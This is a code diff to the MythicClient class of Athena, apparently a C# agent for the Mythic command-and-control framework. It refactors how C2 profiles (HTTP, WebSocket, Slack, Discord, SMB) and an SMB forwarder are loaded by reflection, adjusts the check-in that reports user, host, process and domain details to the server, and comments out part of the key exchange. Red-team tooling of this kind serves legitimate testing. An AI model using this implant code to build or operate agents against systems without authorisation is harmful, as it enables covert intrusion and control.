@@ -1,4 +1,7 @@
-﻿using Athena.Commands;
+﻿#if DEBUG
+#define HTTP
+#endif
+using Athena.Commands;
 using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
@@ -13,21 +16,29 @@ using System.Text;
 using System.Threading.Tasks;
 using Newtonsoft.Json;
 using PluginBase;
+using Athena.Models;
+using System.Reflection;
+using Athena.Models.Config;
+using Athena.Plugins;
 
 namespace Athena
 {
     public class MythicClient
     {
         public EventHandler SetSleep;
-        public MythicConfig MythicConfig { get; set; }
+        public IConfig MythicConfig { get; set; }
+        public IForwarder forwarder { get; set; }
+        //public MythicConfig MythicConfig { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
         public bool exit { get; set; }
         public MythicClient()
         {
             this.exit = false;
-            this.MythicConfig = new MythicConfig();
-            
+            this.MythicConfig = GetConfig();
+            this.forwarder = GetForwarder();
+
+
             this.commandHandler = new CommandHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
@@ -39,7 +50,69 @@ namespace Athena
             this.socksHandler = new SocksHandler();
 
         }
-        #region Communication Functions      
+
+        private IConfig GetConfig()
+        {
+#if WEBSOCKET
+string profile = "AthenaWebsocket";
+#elif HTTP
+string profile = "Athena.Profiles.HTTP";
+#elif SLACK
+string profile = "AthenaSlack";
+#elif DISCORD
+string profile = "AthenaDiscord";
+#elif SMB
+string profile = "AthenaSMB";
+#endif
+
+            Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+
+            if (_tasksAsm == null)
+            {
+                throw new Exception("Could not find loaded tasks assembly.");
+            }
+            foreach (Type t in _tasksAsm.GetTypes())
+            {
+                if (typeof(IConfig).IsAssignableFrom(t))
+                {
+                    return (IConfig)Activator.CreateInstance(t);
+                }
+            }
+            return null;
+        }
+
+
+        private IForwarder GetForwarder()
+        {
+//#if WEBSOCKET
+//string profile = "AthenaWebsocket";
+//#elif HTTP
+//            string profile = "Athena.Fowrwarder.SMB";
+//#elif SLACK
+//string profile = "AthenaSlack";
+//#elif DISCORD
+//string profile = "AthenaDiscord";
+//#elif SMB
+//string profile = "AthenaSMB";
+//#endif
+            string profile = "Athena.Forwarders.SMB";
+            Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+
+            if (_tasksAsm == null)
+            {
+                throw new Exception("Could not find loaded tasks assembly.");
+            }
+            foreach (Type t in _tasksAsm.GetTypes())
+            {
+                if (typeof(IForwarder).IsAssignableFrom(t))
+                {
+                    return (IForwarder)Activator.CreateInstance(t);
+                }
+            }
+            return null;
+        }
+
+#region Communication Functions      
         /// <summary>
         /// Performa  check-in with the Mythic server
         /// </summary>
@@ -53,12 +126,11 @@ namespace Athena
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
                 pid = Process.GetCurrentProcess().Id.ToString(),
-                uuid = MythicConfig.uuid,
+                uuid = Config.uuid,
                 architecture = await Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = Misc.getIntegrity(),
             };
-
             try
             {
                 var responseString = await this.MythicConfig.currentConfig.Send(ct);
@@ -119,7 +191,7 @@ namespace Athena
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
         private void StartForwarder(object sender, TaskEventArgs e)
         {
-            var res = MythicConfig.forwarder.Link(e.job).Result;
+            var res = forwarder.Link(e.job, Config.uuid).Result;
 
             ResponseResult result = new ResponseResult()
             {
@@ -137,7 +209,7 @@ namespace Athena
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
         private void StopForwarder(object sender, TaskEventArgs e)
         {
-            MythicConfig.forwarder.Unlink();
+            forwarder.Unlink();
             _ = commandHandler.AddResponse(new ResponseResult
             {
                 user_output = "Unlinked from agent",
@@ -249,8 +321,8 @@ namespace Athena
                 return null;
             }
         }
-        #endregion
-        #region Helper Functions
+#endregion
+#region Helper Functions
 
         /// <summary>
         /// Parse the GetTaskingResponse and forward them to the required places
@@ -321,7 +393,7 @@ namespace Athena
         {
             Parallel.ForEach(delegates, async del =>
             {
-                await this.MythicConfig.forwarder.ForwardDelegateMessage(del);
+                await this.forwarder.ForwardDelegateMessage(del);
             });
         }
 
@@ -388,18 +460,18 @@ namespace Athena
         {
             try
             {
-                MythicConfig.uuid = res.id;
+                Config.uuid = res.id;
 
                 if (this.MythicConfig.currentConfig.encrypted)
                 {
-                    if (this.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
-                    {
-                        this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
-                    }
-                    else
-                    {
+                    //if (this.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
+                    //{
+                    //    this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
+                    //}
+                    //else
+                    //{
                         this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, this.MythicConfig.currentConfig.psk);
-                    }
+                    //}
                 }
                 return true;
             }
@@ -408,6 +480,6 @@ namespace Athena
                 return false;
             }
         }
-        #endregion
+#endregion
     }
 }
